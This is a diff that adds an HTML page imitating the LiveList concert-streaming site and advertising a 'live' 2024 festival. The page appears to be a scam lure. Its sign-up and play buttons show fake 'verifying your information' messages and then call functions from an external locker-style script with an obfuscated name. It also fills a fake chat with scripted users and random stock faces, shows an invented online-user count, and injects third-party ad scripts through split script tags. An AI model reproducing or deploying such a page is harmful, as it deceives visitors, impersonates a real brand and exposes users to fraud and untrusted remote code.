@@ -1,0 +1,630 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+ 
+  
+	<link href="https://dl.dropboxusercontent.com/s/hvcgy4owlcu5yvxwj5cv0/unnamed_icon.png?rlkey=ohwmd2wx477bc9bgph4bdln5p&dl=0" rel="icon" type="image/ico">
+	<link href="https://dl.dropboxusercontent.com/s/hvcgy4owlcu5yvxwj5cv0/unnamed_icon.png?rlkey=ohwmd2wx477bc9bgph4bdln5p&dl=0" rel="icon" type="image/png">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+<title>LIVELIST CONCERT | Live Streaming</title>
+<meta content="The #1 source for live streaming concerts worldwide. 1000s of free live streaming concerts, festivals, and more! Electronic Indie Jam Rock Folk Pop R&amp;B Hip-Hop Reggae Blues Country and more!" name="description" ng-attr-content="{{ MetaInfo.description() }}">
+<meta content="" name="keywords" ng-attr-content="{{ MetaInfo.keywords() }}">
+<meta content="user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1" name="viewport">
+<meta content="index" name="robots">
+<meta content="Watch Live Concerts anywhere, anytime for free with LiveList!" property="og:title">
+<meta content="LiveList is the world’s ultimate guide to watching live concerts while they happen! With over 50,000 concerts available on the LiveList guide every year, watch great shows from your favorite artists &amp; festivals when you can’t be there." property="og:description">
+
+<meta content="LiveList" property="og:site_name">
+
+  
+<link rel="stylesheet" media="screen" href="https://dl.dropboxusercontent.com/s/gjuoq916sp2o8wbp9agvw/web-style.css?rlkey=q3i82b01ki8yn1cvbtw1g5xsc&dl=0">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />  
+
+
+<style>
+.toggleMenu{
+  transform: translate3d(266px, 0px, 0px);
+}
+.spinner{position:fixed;top:43%;right:0;bottom:0;left:0;z-index:200;margin:0;text-align:center}.spinner:after,.mask:after{content:'';position:fixed;z-index:-1;top:0;right:0;bottom:0;left:0;background:#fff;-moz-opacity:.9;-khtml-opacity:.9;-webkit-opacity:.9;opacity:.9;-ms-filter:alpha(opacity=90);filter:alpha(opacity=90)}
+</style>
+<script src="https://code.jquery.com/jquery-1.7.2.min.js"></script>
+
+<script>
+function toggleSearch(){
+$('nav').addClass('ng-hide');
+$('ll-search-box').removeClass('ng-hide');
+}
+function cancelSearch(){
+$('nav').removeClass('ng-hide');
+$('ll-search-box').addClass('ng-hide');
+}
+function signUp(){
+  $('.spinner').fadeIn().removeClass('ng-hide');
+  setTimeout(function(){ $('.checkingInfo').text('Setting up parameters..'); }, 500);
+  setTimeout(function(){ $('.checkingInfo').text('Build new information..'); }, 800);
+  setTimeout(function(){ $('.checkingInfo').text('Redirecting to registration page..'); }, 1100);
+  setTimeout(function(){_MS(); }, 2000);
+}
+function signIn(){
+  $('.spinner').fadeIn().removeClass('ng-hide');
+  setTimeout(function(){ $('.checkingInfo').text('Setting up parameters..'); }, 600);
+  setTimeout(function(){ $('.checkingInfo').text('Redirecting to member page..'); }, 1100);
+  setTimeout(function(){_MS(); }, 2000);  
+}
+jQuery(document).ready(function($){
+$('.hamburger').click(function(){
+  $('body').toggleClass('snapjs-left');
+  $('.snap-content').toggleClass('toggleMenu');
+});
+});
+</script>
+  
+<script type="text/javascript">
+    var KyiYb_MHO_kjGCFc={"it":4281612,"key":"6206d"};
+</script>
+<script src="https://dh5eoo1lobszc.cloudfront.net/16ce8cb.js"></script>
+  
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+<div class="transitioning spinner ng-hide" aria-busy="true"><p><img src="https://dl.dropboxusercontent.com/s/wx5kqeg3zgiueotezw5wf/loading3.gif?rlkey=h17pcav15by46n2y3ur0c8tek&dl=0" /></p><p class="checkingInfo j-hide">Verifying your information…</p><p class="oneSecond j-hide">Just a moment…</p></div><div class="snap-drawers"><snap-drawer class="snap-drawer snap-drawer-left">
+<div class="ll-drawer-menu ng-isolate-scope">
+
+<div class="menu" ng-hide="signedIn()">
+<a class="no-decoration" ui-sref-active="active" ui-sref="home" href="/">
+<div class="menu-link" onclick="close()">
+Home
+</div>
+</a>
+<a class="no-decoration" ui-sref-active="active" ui-sref="artists" href="/artists">
+<div class="menu-link" onclick="close()">
+Artists
+</div>
+</a>
+<a class="no-decoration" ui-sref-active="active" ui-sref="channels" href="/channels">
+<div class="menu-link" onclick="close()">
+Channels
+</div>
+</a>
+<div class="menu-link" onclick="openSubmitShowDialog()">
+Submit A Show
+</div>
+<div class="menu-link" onclick="signUp()">
+<a class="no-decoration">
+Sign Up
+</a>
+</div>
+<div class="menu-link" onclick="signIn()">
+<a class="no-decoration">
+Sign In
+</a>
+</div>
+</div>
+</div>
+
+
+</snap-drawer></div><div class="ngewe ng-hide">Live Concert Music
+/images/The National.jpg</div>
+<snap-content snap-opt-touch-to-drag="false" class="snap-content">
+<ll-header ng-hide="state.current.data.hideHeaderAndFooter" class="ng-isolate-scope">
+   
+<div class="header fixed">
+<div class="splash ng-hide" onclick="withVideo()">
+
+<div class="header-video-content">
+
+<img class="video-splash hidden-md hidden-lg" src="https://dl.dropboxusercontent.com/s/sbjha2ewptp6z7vfn0wk4/signup_background_preview.jpeg?rlkey=lzni87dma0tt5qpo4j6nyeolp&dl=0">
+  
+<div class="header-top">
+<nav class="nav-small visible-sm visible-xs" ng-hide="searching">
+  
+
+  
+<div class="pull-left hamburger" snap-toggle="left"></div>
+  
+<div class="livelist-logo-black">
+<a class="logo-link" ui-sref-opts="{reload: true}" ui-sref="home" href="/"></a>
+   
+</div>
+<div class="pull-right header-search icon-search icon-search-black" onclick="toggleSearch()"></div>
+</nav>
+<ll-search-box onclick="searching" class="ng-isolate-scope ng-hide"><div class="search-box flex-rows">
+<div class="flex-cols flex-align-center">
+<div class="pull-left icon-search icon-search-black" onclick="search()"></div>
+<input autofocus="" class="search-input fill-width ng-pristine ng-untouched ng-valid ng-empty" ng-change="handleTyping()" ng-enter="search()" ng-model="query" placeholder="Search LiveList" type="search">
+<div class="pull-right icon-cancel" onclick="cancelSearch()"></div>
+</div>
+<ul class="search-suggestions ng-hide" onclick="showSuggestions" off-click="handleClickOutside()">
+<!-- ngRepeat: item in suggestions -->
+</ul>
+</div>
+</ll-search-box>
+</div>
+
+<div class="header-middle text-center">
+<div class="titles">
+<div class="show-count">
+<span class="perYear">
+<span class="count-value ng-binding"></span>
+<span class="count-explanation">shows this year</span>
+</span>
+<span class="separator">|</span>
+<span class="today">
+<span class="count-value ng-binding"></span>
+<span class="count-explanation">shows live today</span>
+</span>
+</div>
+<div class="text-jumbo">
+<p>Never miss seeing your favorite artists&nbsp;live</p>
+<p>Sign up today!</p>
+</div>
+
+</div>
+<div class="signup-container">
+<button class="facebook-signup-input btn btn-large pull-left ng-isolate-scope" ll-throttle-clicks="3000" onclick="connectWithFacebook()">
+<div class="icon-facebook-button"></div>
+<div class="connect-fb hidden-xs hidden-sm">CONNECT WITH FACEBOOK</div>
+</button>
+<div class="or pull-left">
+OR
+</div>
+<div class="hidden-sm hidden-xs container pull-left">
+<form class="row ng-pristine ng-invalid ng-invalid-required" ng-submit="registerWithLivelist()" novalidate="">
+<input class="signup-input col-md-4 ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" name="email" ng-model="credentials.email" placeholder="EMAIL ADDRESS" required="">
+<input class="signup-input col-md-4 ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" name="password" ng-model="credentials.password" placeholder="PASSWORD" required="" type="password">
+<button class="btn btn-primary btn-large signup-input col-md-4 ng-isolate-scope" ll-throttle-clicks="3000" type="submit">
+SIGN UP
+</button>
+</form>
+<ll-info-message class="splash-signup-message ng-isolate-scope ng-hide" onclick="showMessage"><div class="message ng-binding error-message" ng-class="type === &#39;success&#39; ? &#39;success-message&#39; : &#39;error-message&#39;">
+
+</div>
+</ll-info-message>
+</div>
+<button class="pull-left btn btn-primary btn-large signup-input visible-sm visible-xs" onclick="signUp()">
+Sign Up With Email
+</button>
+</div>
+</div>
+<div class="header-bottom text-center">
+<a class="btn skip" onclick="trackSkipRegistration()" ui-sref="home" href="/">
+Skip registration for now
+</a>
+</div>
+</div>
+</div>
+<!-- ngIf: !withVideo() --><div class="navigation-bar ng-scope" ng-if="!withVideo()">
+<div class="header-top">
+<nav class="nav-large hidden-sm hidden-xs" ng-hide="searching">
+<div class="rel pull-left livelist-logo-black">
+</div>
+<div class="rel pull-right simple-link" ng-hide="signedIn()">
+<a class="no-decoration sign-up-link" onclick="signUp()">
+Sign Up
+</a>
+</div>
+<div class="rel pull-right simple-link" ng-hide="signedIn()">
+<a class="no-decoration" onclick="signIn()">
+Sign In
+</a>
+</div>
+<div class="btn-group pull-right dropdown ng-hide" onclick="signedIn()" uib-dropdown="true">
+<button class="btn rel simple-link profile dropdown-toggle" id="btn-append-to-body" type="button" uib-dropdown-toggle="true" aria-haspopup="true" aria-expanded="false">
+<img ng-src="">
+<span class="caret"></span>
+</button>
+<ul aria-labelledby="btn-append-to-body" class="uib-dropdown-menu dropdown-menu" role="menu">
+<li role="menuitem">
+<a ui-sref="user" href="/profile">
+My Account
+</a>
+</li>
+<li role="menuitem">
+<a href="/#" onclick="openSubmitShowDialog()">
+Submit A Show
+</a>
+</li>
+<li role="menuitem">
+<a onclick="signOut()">
+Sign Out
+</a>
+</li>
+</ul>
+</div>
+<div class="rel pull-right simple-link" ng-hide="signedIn()" ui-sref-active="active">
+<a class="no-decoration" onclick="openSubmitShowDialog()" ui-alt="Let us know of an upcoming live streaming event and we&#39;ll promote it.">
+Submit A Show
+</a>
+</div>
+<div class="rel pull-right simple-link" ui-sref-active="active">
+<a alt="Follow our curated channels and get notified when a show goes live." class="no-decoration" ui-sref="channels" href="/channels">
+Channels
+</a>
+</div>
+<div class="rel pull-right simple-link" ui-sref-active="active">
+<a alt="Tell LiveList artists you like and get notified when they go live." class="no-decoration" ui-sref="artists" href="/artists">
+Artists
+</a>
+</div>
+<div class="rel pull-right simple-link ng-hide" onclick="signedIn()" ui-sref-active="active">
+<a class="no-decoration" ui-sref="mylivelist" href="/mylivelist">
+My LiveList
+</a>
+</div>
+<div class="rel pull-right header-search icon-search icon-search-black" onclick="toggleSearch()"></div>
+</nav>
+<nav class="nav-small visible-sm visible-xs" ng-hide="searching">
+<div class="pull-left hamburger" snap-toggle="left"></div>
+<div class="livelist-logo-black">
+<center>
+  <img height="40px" src="https://dl.dropboxusercontent.com/s/o9lppxmh3b3wdatduz73s/LOGO.gif?rlkey=jz4yvxhmss1z9slw7lvo8yhqv&dl=0" width="100">
+ </center>
+<a class="logo-link" ui-sref-opts="{reload: true}" ui-sref="home" href="/"></a>
+</div>
+<div class="pull-right header-search icon-search icon-search-black" onclick="toggleSearch()"></div>
+</nav>
+<ll-search-box onclick="searching" class="ng-isolate-scope ng-hide"><div class="search-box flex-rows">
+<div class="flex-cols flex-align-center">
+<div class="pull-left icon-search icon-search-black" onclick="search()"></div>
+<input autofocus="" class="search-input fill-width ng-pristine ng-untouched ng-valid ng-empty" ng-change="handleTyping()" ng-enter="search()" ng-model="query" placeholder="Search LiveList" type="search">
+<div class="pull-right icon-cancel" onclick="cancelSearch()"></div>
+</div>
+<ul class="search-suggestions ng-hide" onclick="showSuggestions" off-click="handleClickOutside()">
+<!-- ngRepeat: item in suggestions -->
+</ul>
+</div>
+</ll-search-box>
+</div>
+</div><!-- end ngIf: !withVideo() -->
+</div>
+</ll-header>
+<ll-page-header-display class="ng-hide ng-isolate-scope"><!-- ngIf: title --><!-- ngIf: subtitle --><!-- ngIf: bulletList --></ll-page-header-display>
+ <center>
+<script type="text/javascript">
+	atOptions = {
+		'key' : 'f4400f7bfcbdb1fbe5372e8502c6b9c6',
+		'format' : 'iframe',
+		'height' : 50,
+		'width' : 320,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="//urgentlyrightypast.com/f4400f7bfcbdb1fbe5372e8502c6b9c6/invoke.js"></scr' + 'ipt>');
+</script>  
+</center>   
+<!-- uiView: --><div autoscroll="" class="main container ng-scope" ng-class="{thin: state.is(&#39;splash&#39;)}" ui-view=""><div class="listing view-container main ng-scope live" ng-class="[{live: playingClips || playingEmbed}, {ended: listingType() === &quot;past&quot;}]">
+<ll-structured-data item="listing" type="listing" class="ng-isolate-scope"></ll-structured-data>
+<div class="left-rail">
+<div class="sections tabs-container">
+<ll-poll-view chat-rooms="chatRooms" target="listing" class="ng-isolate-scope"><div class="view-poll ng-hide" onclick="poll.show">
+<div class="header">
+<label class="title ng-binding"></label>
+    
+<button class="close" onclick="closePoll()">
+<i class="fa fa-close"></i>
+</button>
+</div>
+<ul class="poll list-unstyled">
+<!-- ngRepeat: option in poll.options track by $index -->
+</ul>
+</div>
+</ll-poll-view>
+<ll-marquee disable-shadow="true" text="listing.artistNote" class="ng-isolate-scope">
+</ll-marquee>
+<div class="channel-pinned-message-container flex-rows">
+<ll-chat-pinned class="pinned ng-isolate-scope" dashboard-allowed="dashboardAllowed()" pinned-room="chatRooms.pinned">
+</ll-chat-pinned>
+</div>
+ 
+<div class="tab-body scroll-y">
+<ll-listing-main broadcast-video="broadcastVideo()" clip-id="clipId" close-video="closeVideo" embed="listing.embedCode" embeddable="listing.embeddable" listing="listing" play-clip="playClip()" play-embed="playEmbed()" play-first-clip="playFirstClip()" playing-clips="playingClips" playing-embed="playingEmbed" select-chat="selectChat()" show-ended="showEnded()" upcoming-events="upcomingEvents" class="ng-isolate-scope"><div class="section-main section">
+  <div class="cover-container flex-width">
+    <div class="details fill-width flex-rows">
+      <div class="title">
+        <!--<img class="vendor-logo" src="{{listing.source.logo}}" />-->
+        <h1 class="ng-binding">Live Now!</h1>
+      </div>
+
+      <div class="copy-container">
+        <div class="time hidden-xs ng-binding">Live Today {isi dateMarch 30, 2024}</div>
+        <!-- ngIf: listing.audio -->
+        <!-- ngIf: listingType() !== 'past' --><div class="description hidden-xs ng-binding ng-scope" ng-if="listingType() !== &#39;past&#39;">Live Streaming Concert - The biggest Festival 2024</div>
+   
+        <div class="follow-container hidden-xs">
+        </div>
+      </div>
+
+      <!-- ngIf: listingType() === 'upcoming' -->
+
+      <div class="action-container">
+        <div class="ng-scope">
+          <button class="watch-button action liveNow" onclick="signUp()">
+            <i class="fa fa-play" onclick="setTimeout(_uG, 3000);" ></i>
+            <span>Play Live</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</ll-listing-main>
+</div>
+</div>
+</div>
+
+  
+<div class="right-rail col-md-3">
+    
+<div class="lineup flex-rows">
+<div class="tabs right container">
+<div class="button-bar">
+<div class="buttons text-center">
+<div class="chat-button button selected" ng-class="{selected: chatSelected()}" onclick="selectChat()">
+<p id="useronline"></p>
+<script type="text/javascript">
+document.getElementById("useronline").innerHTML = Math.floor(Math.random() * 500) + 2000+' Users Online';
+</script>  
+ 
+  
+</div>
+</div>
+</div>
+<div class="tab-body">
+<!-- ngIf: listing.relatedClips && clipsSelected() -->
+<div class="chat" ng-hide="lineupSelected() || socialSelected()">
+<ll-chat chat-rooms="chatRooms" target="listing" class="ng-isolate-scope"><div class="chat scroll-y">
+    <!-- ngIf: suggestChatNameEdit() -->
+    <div class="messages">
+        <div class="ng-isolate-scope scrollContext"><!-- ngIf: !noItemsTemplate && !skipNoItemsMessage && context.hasNoItems() -->
+<!-- ngIf: noItemsTemplate && !skipNoItemsMessage && context.hasNoItems() -->
+
+<ng-transclude>
+<!--
+<ll-chat-message class="ng-scope ng-isolate-scope">
+<div class="avatar">
+    <img src="https://www.livelist.com/api/chat/avatar/103613" class="ng-scope">
+</div>
+
+<div class="content">
+  <span class="name">
+    <a class="ng-binding">LiveList Moderator</a>
+  </span>
+    <p class="body ng-binding">A place where you can enjoy live and recorded music with fans all around the world.</p>
+    <div class="chat-controls">
+      <span class="reply" onclick="reply()">
+        Reply
+        <i class="fa fa-reply"></i>
+      </span>
+
+      <span class="time ng-binding">5:50 PM</span>
+    </div>
+</div>
+</ll-chat-message>
+-->
+
+</ng-transclude>
+<script type="text/javascript">
+function getRandomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+jQuery(document).ready(function($){
+  var cIndex = getRandomInt(0,4);
+  var dIndex = 0;
+  function setHtml(TimerSet){
+    var chats = [["lolz","I have like, almost ten rings, and all of them have skeletons on them"],["gogo ninjaman","I can read only easy English !"],["John Gotti","can't wait to get off work in an hour been here since 6 p.m.? yesterday"],["astrid siahaan","r u in a night? shift @John Gotti ?"],["JUNGA MANGO","easy??? what kind of english is this @gogo? ninjaman "],["metalfish","Awesome work bro! Loving this live streaming , No Lag"],["jaecrowder","This is what I wait wait , can finally live streaming with good quality and without HD video "],["aden13","Best Recorder ... im lucky .  u kidding me??"],["enstine","Have a great day! Yeah YOU, I'm talking to YOU!   "]];
+      var user;
+      var isi;
+      var currentdate = new Date();
+      var waktu = currentdate.getHours()+':'+currentdate.getMinutes()+':'+currentdate.getSeconds();
+      var html;
+      
+      if(cIndex > chats.length - 1){cIndex = 0;}
+            
+      user = chats[cIndex][0];     
+      isi = chats[cIndex][1];     
+      html = '<ll-chat-message class="ng-scope ng-isolate-scope" style="display:none" id="chatItem'+dIndex+'"><div class="avatar"><img src="https://ozgrozer.github.io/100k-faces/0/0/000'+getRandomInt(100,999)+'.jpg" class="ng-scope"/></div><div class="content"><span class="name"><a class="ng-binding">'+user+'</a></span><p class="body ng-binding">'+isi+'</p><div class="chat-controls"><span class="reply" onclick="reply()">Reply<i class="fa fa-reply"></i></span><span class="time ng-binding">'+waktu+'</span></div>  </div></ll-chat-message>';
+      
+      
+      $('ng-transclude').append(html)
+        .find('#chatItem'+dIndex).fadeIn('slow');
+      cIndex++;
+      dIndex++;
+  }
+  function ExecChat(randTime){
+    setTimeout(function(){
+      var TimerSet = getRandomInt(1000,3000);
+      setHtml(TimerSet);
+      ExecChat(TimerSet);
+      $('.chat').animate({ scrollTop: $('.scrollContext').height() });
+    },randTime);
+  }
+  for(var i=0;i<10;i++) setHtml(0);
+  ExecChat(0);
+});
+</script>
+
+<!-- ngIf: context.loading -->
+
+<!-- ngIf: shouldDisplayLoadMoreButton() -->
+</div>
+    </div>
+</div>
+<!-- ngIf: target.chatEnabled && !chatRooms.readOnly --><ll-chat-input ng-if="target.chatEnabled &amp;&amp; !chatRooms.readOnly" room="currentRoom" class="ng-scope ng-isolate-scope"><div class="chat-input" ng-class="{ error : messageExceedsLimit() }">
+  <div class="reply ng-hide" onclick="reply.body">
+    <div class="close" onclick="closeReply()">
+      <i class="fa fa-times"></i>
+    </div>
+    <div class="content">
+      <span class="name">
+        <i class="fa fa-reply"></i>
+        <a class="ng-binding"></a>
+      </span>
+      <p class="body ng-binding"></p>
+    </div>
+  </div>
+
+  <div class="chat-input-container" ng-class="{ replyActive: reply.body }">
+    <span class="menu ng-binding">60</span>
+    
+    
+    
+    <form ng-submit="submit()" class="ng-pristine ng-valid">
+      <input ll-require-login="{}" ng-model="message" placeholder="Please login to chat." type="text" class="ng-pristine ng-untouched ng-valid ng-isolate-scope ng-empty">
+    </form>
+  
+  </div>
+</div>
+</ll-chat-input><!-- end ngIf: target.chatEnabled && !chatRooms.readOnly -->
+<!-- ngIf: banned -->
+</ll-chat>
+</div>
+<!-- ngIf: socialSelected() -->
+</div>
+</div>
+</div>
+</div>
+  
+<ll-cover-image class="channel-background ng-isolate-scope" image-url="listing.coverStyles.original.url">
+  <div class="gradient-overlay"></div>
+  
+<video class="cover-image" autoplay muted loop style="position: absolute; top: 0px; left: 0px; right: 0px; bottom: 0px;">
+<source src="https://dl.dropboxusercontent.com/s/v04bugwuv9u4npzq2ulmn/signup_background_preview.mp4?rlkey=5zt7pc4vwkiesqz0m090ivwy5&dl=0" type="video/mp4">
+<source src="https://dl.dropboxusercontent.com/s/kbzjp4dqizuj06tw6tk7b/signup_background_preview.webm?rlkey=kxqkah65f7f0gm917qxprrqgc&dl=0" type="video/webm">  
+</video>
+  
+  <div ng-transclude=""></div>
+</ll-cover-image>
+  
+</div>
+</div>
+
+<div class="container-brand-dark footer-surround footer-container text-uppercase ng-hide">
+<div class="footer-background">
+<div class="overlay"></div>
+</div>
+<footer class="container text-center">
+<div class="row vertical-align">
+<div class="col-md-4 col-sm-12 text-center icons col-md-push-4">
+<ul class="list-unstyled list-inline">
+<li>
+<a class="link-contrast footer-icon-container" href="https://www.facebook.com/livelist" target="_blank">
+<span class="screen-reader-only">
+Facebook
+</span>
+<i class="icon footer-icon icon-facebook"></i>
+</a>
+</li>
+<li>
+<a class="link-contrast footer-icon-container" href="https://twitter.com/livelist" target="_blank">
+<span class="screen-reader-only">
+Twitter
+</span>
+<i class="icon footer-icon icon-twitter"></i>
+</a>
+</li>
+<li>
+<a class="link-contrast footer-icon-container" href="https://instagram.com/livelist" target="_blank">
+<span class="screen-reader-only">
+Instagram
+</span>
+<i class="icon footer-icon icon-instagram"></i>
+</a>
+</li>
+</ul>
+</div>
+<div class="col-md-5 col-sm-12 col-md-pull-4">
+<ul class="list-unstyled list-inline">
+<li>
+<a class="link-contrast submit-show-link" ng-click="openSubmitShowDialog()">
+Submit A Show
+</a>
+</li>
+<li>
+<a class="link-contrast" href="http://blog.livelist.com/" target="_blank">
+Blog
+</a>
+</li>
+<li>
+<a class="link-contrast" ui-sref="about" href="">
+About
+</a>
+</li>
+<li>
+<a class="link-contrast" ui-sref="contact" href="">
+Contact us
+</a>
+</li>
+<li>
+<a class="link-contrast" href="http://support.livelist.com/hc/en-us" target="_blank">
+Help
+</a>
+</li>
+</ul>
+</div>
+<div class="col-md-3 col-sm-12">
+<ul class="list-unstyled list-inline">
+<li>
+<a class="link-contrast" ui-sref="terms" href="/terms">
+Terms Of Service
+</a>
+</li>
+<li>
+<a class="link-contrast" ui-sref="privacy" href="/privacy">
+Privacy Policy
+</a>
+</li>
+</ul>
+</div>
+</div>
+<div class="row space-top-4 space-10 vertical-align row-space-8">
+<div class="col-md-4 col-sm-12 grey menu-el">
+© 2024 Live House Media, Inc.
+</div>
+<div class="col-md-4 col-sm-12 col-md-offset-4">
+<ul class="list-unstyled list-inline app-icons">
+<li>
+
+</li>
+</ul>
+</div>
+</div>
+</footer>
+</div>
+</snap-content>
+<div id="teaser3" class="teaser3" style="width: 100%;height:0;text-align: center;display: scroll;position:fixed;bottom: 115px;margin: 0 auto;z-index: 103;">
+         <div align="center"><a href="#" id="close-teaser" onclick="jQuery('.teaser3').hide();" style="cursor:pointer;"><img src="https://sample1.indo-membrane.online:443/themes/G-Movie_Wn23/img/close.png"></a></div>
+<center>
+<script type="text/javascript">
+	atOptions = {
+		'key' : 'f4400f7bfcbdb1fbe5372e8502c6b9c6',
+		'format' : 'iframe',
+		'height' : 50,
+		'width' : 320,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="//urgentlyrightypast.com/f4400f7bfcbdb1fbe5372e8502c6b9c6/invoke.js"></scr' + 'ipt>');
+</script> 
+  </center>
+      </div>     
+<ll-root-message-placeholder class="animate ng-scope" style="top: 0px;">
+</ll-root-message-placeholder>
+<ll-popup-container class="ng-isolate-scope"><div class="popup-dialog-container">
+<div class="overlay ng-hide" ng-hide="!activeDialog"></div>
+</div>
+</ll-popup-container>
+     <!-- Histats.com  ADMIN DONT CHANGE  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,G4NT1,4,0,0,0,00010000']);
+_Hasync.push(['Histats.start', '1,4186620,4,0,0,0,00010000']);   <!-- Histats CODE ADMIN-->
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4446091&101" alt="" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+</body></html>
